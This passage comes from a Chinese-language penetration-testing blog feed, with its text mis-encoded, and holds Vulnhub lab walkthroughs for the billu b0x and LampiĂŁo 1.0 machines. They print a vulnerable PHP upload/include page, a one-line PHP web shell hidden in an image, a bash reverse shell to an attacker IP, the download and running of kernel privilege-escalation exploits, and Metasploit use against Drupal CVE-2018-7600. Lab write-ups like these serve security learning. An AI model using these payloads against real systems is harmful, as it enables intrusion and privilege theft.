class="code"><pre><span class="line">biLLu</span><br><span class="line">hEx_it</span><br></pre></td></tr></table></figure><p>ç™»é™†ä¸Šæ¥åå‘ç°ä¸€ä¸ªpancel.phpèƒ½è¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p>å¯ä»¥åœ¨å…ˆè¯»å–ä»–çš„æºç </p><p><strong>pancel.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;c.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;head2.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]!=<span class="literal">true</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to billu b0x &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form method=post style=&quot;margin: 10px 0px 10px 95%;&quot;&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;lg&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form method=post&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;select name=load&gt;</span></span><br><span class="line"><span class="string">    &lt;option value=&quot;show&quot;&gt;Show Users&lt;/option&gt;</span></span><br><span class="line"><span class="string">&lt;option value=&quot;add&quot;&gt;Add User&lt;/option&gt;</span></span><br><span class="line"><span class="string">&lt;/select&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &amp;nbsp&lt;input type=submit name=continue value=&quot;continue&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$dir</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="variable">$choice</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$address</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>]);</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$iname</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$r</span>=<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"><span class="variable">$image</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$r</span>,<span class="variable">$image</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$finfo</span> = @<span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME); </span><br><span class="line"><span class="variable">$filetype</span> = @<span class="variable">$finfo</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/image\/jpeg/&#x27;</span>,<span class="variable">$filetype</span> )  || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/image\/png/&#x27;</span>,<span class="variable">$filetype</span> ) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/image\/gif/&#x27;</span>,<span class="variable">$filetype</span> ))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;uploaded_images/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Uploaded successfully &quot;</span>;</span><br><span class="line">  <span class="variable">$update</span>=<span class="string">&#x27;insert into users(name,address,image,id) values(\&#x27;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="variable">$address</span>.<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="variable">$iname</span>.<span class="string">&#x27;\&#x27;, \&#x27;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;\&#x27;)&#x27;</span>; </span><br><span class="line"> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$update</span>);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸éš¾å‘ç°ï¼Œè¯¥phpåœ¨å¯¹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä»…ä»…æ‰§è¡Œäº†ä¸€ä¸ªç™½åå•çš„é™å®šï¼Œè€Œæ²¡æœ‰æ‰§è¡Œå…¶ä»–ä»»ä½•åˆ¤æ–­åŠè¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå›¾ç‰‡ğŸä¸Šä¼ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png/b + 1.php/a 2.png</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸåå›¾ç‰‡å°†ä¼šè¢«ç§»åŠ¨åˆ°&#x2F;uploaded_imagesï¼Œä½†ç°åœ¨è¿˜æ²¡æœ‰ä¸€ä¸ªåŒ…å«å›¾ç‰‡ğŸçš„ä¸€ä¸ªç‚¹</p><p>å®¡è®¡ä»£ç ï¼Œå½“loadå‚æ•°ä¸ºå›¾ç‰‡é©¬çš„ä¸€ä¸ªåœ°å€å°±å¯ä»¥è¿›è¡Œä¸€ä¸ªåŒ…å«ï¼Œä¸”æ²¡æœ‰è¿›è¡Œè¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$dir</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="variable">$choice</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œå†ä»¤loadå‚æ•°ä¸ºå›¾ç‰‡é©¬çš„åœ°å€ï¼Œå³å¯è¿›è¡ŒåŒ…å«</p><p>å¯ä»¥å‘ç°ï¼ŒæˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬çš„å‘½ä»¤</p><p>æ‰€ä»¥åå¼¹shellåˆ°kaliä¸Šï¼Œä»¥ä¾¿è¿›è¡Œä¸€ä¸ªææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.237.128/2333 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure><p>éœ€è¦æŠŠpayloadurlç¼–ç ä¸€æ¬¡ï¼ŒåŒæ—¶ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p>æˆåŠŸåå¼¹ï¼Œæ‹¿åˆ°ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„æƒé™</p><p>æŸ¥çœ‹ç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯å’Œå†…æ ¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>ç”¨kaliè‡ªå¸¦çš„searchsploitæœç´¢è¯¥ç‰ˆæœ¬æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 12.04</span><br></pre></td></tr></table></figure><p>æ˜¯è¿™ä¸ª:<code>linux/local/37292.c</code></p><p>æ‰¾åˆ°exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/exploitdb/exploits/linux/local</span><br><span class="line">cp 37292.c /root</span><br></pre></td></tr></table></figure><p>å¼€å¯ pythonæœåŠ¡</p><p><code>python3 -m http.server 8000 </code></p><p>å› ä¸ºæƒé™ä¸å¤Ÿï¼Œæ‰€ä»¥å»åˆ°&#x2F;tmp&#x2F;ç›®å½•ä¸‹ï¼Œç„¶åç”¨wgetä¸‹è½½expæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.237.128:8000/37292.c</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘.cæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 37292.c -o exp</span><br></pre></td></tr></table></figure><p>ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br></pre></td></tr></table></figure><p>å‡çº§åˆ‡æ¢äº¤äº’å¼shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€é¶æœºæµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LampiÃ£o 1.0æ¸—é€æµ‹è¯•</title>
      <link href="/2023/02/20/Lampi%C3%A3o%201.0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/02/20/Lampi%C3%A3o%201.0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhubé¶æœºç³»åˆ—-Lampiao-1-0æ¸—é€æµ‹è¯•"><a href="#Vulnhubé¶æœºç³»åˆ—-Lampiao-1-0æ¸—é€æµ‹è¯•" class="headerlink" title="Vulnhubé¶æœºç³»åˆ—:LampiÃ£o 1.0æ¸—é€æµ‹è¯•"></a>Vulnhubé¶æœºç³»åˆ—:LampiÃ£o 1.0æ¸—é€æµ‹è¯•</h1><h2 id="æ¶‰åŠçŸ¥è¯†"><a href="#æ¶‰åŠçŸ¥è¯†" class="headerlink" title="æ¶‰åŠçŸ¥è¯†"></a>æ¶‰åŠçŸ¥è¯†</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.CVE-2018-7600</span><br><span class="line">2.dirty cowææƒ</span><br></pre></td></tr></table></figure><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>é¶æœºä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/lampiao-1,249/">LampiÃ£o: 1 ~ VulnHub</a>ï¼Œ<a href="https://www.kali.org/get-kali/#kali-virtual-machines">Kali Linux</a></p><p><a href="https://imgse.com/i/ppF64P0"><img src="https://s1.ax1x.com/2023/03/02/ppF64P0.png" alt="ppF64P0.png"></a></p><p>VMwareæ‰“å¼€<code>.ovf</code>æ–‡ä»¶</p><p>æˆåŠŸåº”å¦‚å›¾</p><p><a href="https://imgse.com/i/ppF65GV"><img src="https://s1.ax1x.com/2023/03/02/ppF65GV.png" alt="ppF65GV.png"></a></p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><h3 id="è·å–ç›®æ ‡æœºipåŠç«¯å£"><a href="#è·å–ç›®æ ‡æœºipåŠç«¯å£" class="headerlink" title="è·å–ç›®æ ‡æœºipåŠç«¯å£"></a>è·å–ç›®æ ‡æœºipåŠç«¯å£</h3><p><strong>ip</strong></p><p>æ‰«æå½“å‰ç½‘æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.30.0/24</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppF6oxU"><img src="https://s1.ax1x.com/2023/03/02/ppF6oxU.png" alt="ppF6oxU.png"></a></p><p>å…¶ä¸­<code>192.168.30.133</code>å¯ç”¨</p><p><a href="https://imgse.com/i/ppF67MF"><img src="https://s1.ax1x.com/2023/03/02/ppF67MF.png" alt="ppF67MF.png"></a></p><p><strong>æ‰«æç›®æ ‡ä¸»æœºç«¯å£</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.30.133 -p-</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppF6bqJ"><img src="https://s1.ax1x.com/2023/03/02/ppF6bqJ.png" alt="ppF6bqJ.png"></a></p><p>å¼€æ”¾äº†ä¸€ä¸ª1898ç«¯å£</p><p><a href="https://imgse.com/i/ppF6LZ9"><img src="https://s1.ax1x.com/2023/03/02/ppF6LZ9.png" alt="ppF6LZ9.png"></a></p><p><strong>æ‰«æç›®å½•æ•æ„Ÿæ–‡ä»¶</strong></p><p><a href="https://imgse.com/i/ppF6XI1"><img src="https://s1.ax1x.com/2023/03/02/ppF6XI1.png" alt="ppF6XI1.png"></a></p><p>å‘ç°<code>/CHANGELOG.txt</code>æ—¥å¿—æ–‡ä»¶</p><p>åœ¨é‡Œé¢å‘ç°äº†ç½‘ç«™ä½¿ç”¨çš„æ˜¯drupalæ¡†æ¶ï¼ŒåŒæ—¶ç‰ˆæœ¬æ›´æ–°åˆ°äº† 7.54</p><p><a href="https://imgse.com/i/ppF6vPx"><img src="https://s1.ax1x.com/2023/03/02/ppF6vPx.png" alt="ppF6vPx.png"></a></p><p>é‚£ä¹ˆå°±å¥½åŠäº†ï¼Œç›´æ¥æ‰¾Drupal7ç›¸å…³æ¼æ´ï¼Œæ‰¾åˆ°<a href="https://cert.360.cn/report/detail?id=c92cfff2634a44c8b1d6bd5e64c07f3d">Drupalæ ¸å¿ƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</a></p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>åˆ©ç”¨msfç›´æ¥æ‰“</p><p><a href="https://imgse.com/i/ppFc9MD"><img src="https://s1.ax1x.com/2023/03/02/ppFc9MD.png" alt="ppFc9MD.png"></a></p><p>optionè®¾ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">set rhost 192.168.30.133</span><br><span class="line">set rport 1898</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppFcFZd"><img src="https://s1.ax1x.com/2023/03/02/ppFcFZd.png" alt="ppFcFZd.png"></a></p><p>è·å–åˆ°äº†ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™</p><p><a href="https://imgse.com/i/ppFcVit"><img src="https://s1.ax1x.com/2023/03/02/ppFcVit.png" alt="ppFcVit.png"></a></p><h3 id="sshç™»é™†è¿æ¥"><a href="#sshç™»é™†è¿æ¥" class="headerlink" title="sshç™»é™†è¿æ¥"></a>sshç™»é™†è¿æ¥</h3><p><strong>ç”¨æˆ·å</strong></p><p>åœ¨&#x2F;homeç›®å½•ä¸‹æœ‰ä¸ªtiagoæ–‡ä»¶å¤¹ï¼Œä¸ºå…¶ç”¨æˆ·å</p><p><a href="https://imgse.com/i/ppAR2Of"><img src="https://s1.ax1x.com/2023/03/04/ppAR2Of.png" alt="ppAR2Of.png"></a></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œç”¨python å¯åŠ¨ç»ˆç«¯ï¼Œè·å–ç”¨æˆ·åï¼Œå‰ææ˜¯ç›®æ ‡vmå¿…é¡»æœ‰python çš„ç¼–è¯‘ç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppARWm8"><img src="https://s1.ax1x.com/2023/03/04/ppARWm8.png" alt="ppARWm8.png"></a></p><p><strong>å¯†ç </strong></p><p>åœ¨<code>/var/www/html/sites/default/settings.php</code></p><p><a href="https://imgse.com/i/ppARf0S"><img src="https://s1.ax1x.com/2023/03/04/ppARf0S.png" alt="ppARf0S.png"></a></p><p>å°è¯•sshç™»å½•ï¼Œç™»é™†æˆåŠŸ</p><p><a href="https://imgse.com/i/ppAR5kQ"><img src="https://s1.ax1x.com/2023/03/04/ppAR5kQ.png" alt="ppAR5kQ.png"></a></p><p>ä½†æ˜¯è¿™ä¸ªè´¦æˆ·æ˜¯æ²¡æœ‰rootæƒé™çš„ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥å°±æ˜¯</p><h3 id="è„ç‰›ææƒ"><a href="#è„ç‰›ææƒ" class="headerlink" title="è„ç‰›ææƒ"></a>è„ç‰›ææƒ</h3><p><strong>æ£€æŸ¥å†…æ ¸</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppARIYj"><img src="https://s1.ax1x.com/2023/03/04/ppARIYj.png" alt="ppARIYj.png"></a></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ä¸€ä¸ªå†…æ ¸ç‰ˆæœ¬æ˜¯<strong>4.4.0-31-generic</strong>ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„å†…æ ¸æ˜¯è¿˜å­˜åœ¨è„ç‰›æ¼æ´çš„</p><p>åˆ©ç”¨<a href="https://codeload.github.com/mzet-/linux-exploit-suggester/zip/refs/heads/master">linux-exploit-suggester</a>è¿›è¡Œææƒcveæ¼æ´æ£€æµ‹</p><p>ä¸‹è½½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mzet-/linux-exploit-suggester</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åˆ°ç›®æ ‡æœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload linux-exploit-suggester /tmp</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppARHlq"><img src="https://s1.ax1x.com/2023/03/04/ppARHlq.png" alt="ppARHlq.png"></a></p><p>åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppARb60"><img src="https://s1.ax1x.com/2023/03/04/ppARb60.png" alt="ppARb60.png"></a></p><p>è¿™é‡Œåˆ—å‡ºäº†å¾ˆå¤šæœ‰å¯èƒ½ç”¨äºææƒçš„cveï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©[CVE-2016-5195]dirty crow 40847</p><p><a href="https://imgse.com/i/ppARqXV"><img src="https://s1.ax1x.com/2023/03/04/ppARqXV.png" alt="ppARqXV.png"></a></p><p>åŒæ ·downä¸‹æ¥ä¸Šä¼ åˆ°ç›®æ ‡æœº</p><p><a href="https://imgse.com/i/ppAROmT"><img src="https://s1.ax1x.com/2023/03/04/ppAROmT.png" alt="ppAROmT.png"></a></p><p><code>c++</code> æ 